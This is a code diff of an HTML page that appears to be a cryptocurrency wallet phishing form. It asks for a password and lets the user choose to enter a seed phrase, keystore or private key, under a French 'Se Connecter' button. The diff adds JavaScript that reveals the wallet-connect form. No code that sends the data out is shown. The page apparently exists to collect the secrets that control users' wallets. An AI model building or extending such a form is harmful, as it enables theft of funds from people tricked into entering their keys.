@@ -161,13 +161,27 @@
         <input type="password" id="password" name="password" required>
           <label for="wallet-info-type">Select Wallet Information Type:</label>
             <select id="wallet-info-type" onchange="showInfoInput()">
-                <option value="phrase">Phrase</option>
-                <option value="keystore">Keystore</option>
-                <option value="private-key">Private Key</option>
+                <option id="test1" value="phrase">Phrase</option>
+                <option id="test2" value="keystore">Keystore</option>
+                <option id="test3" value="private-key">Private Key</option>
             </select>
         <button type="button" id="submitData" name="submitData" >Se Connecter</button>
     </form>
     <script>
+         function selectWallet() {
+            var selectedWallet = document.getElementById("wallet-list").value;
+            document.getElementById("selected-wallet").value = selectedWallet;
+            showWalletForm(selectedWallet);
+        }
+
+        function showWalletForm(selectedWallet) {
+            // Display the wallet connection form
+            document.getElementById('wallet-connect-form').style.display = 'block';
+
+            // Show or hide information input based on the selected wallet type
+            showInfoInput(selectedWallet);
+        }
+
          function showInfoInput(selectedWallet) {
             // Retrieve selected information type
             const walletInfoType = document.getElementById('wallet-info-type').value;
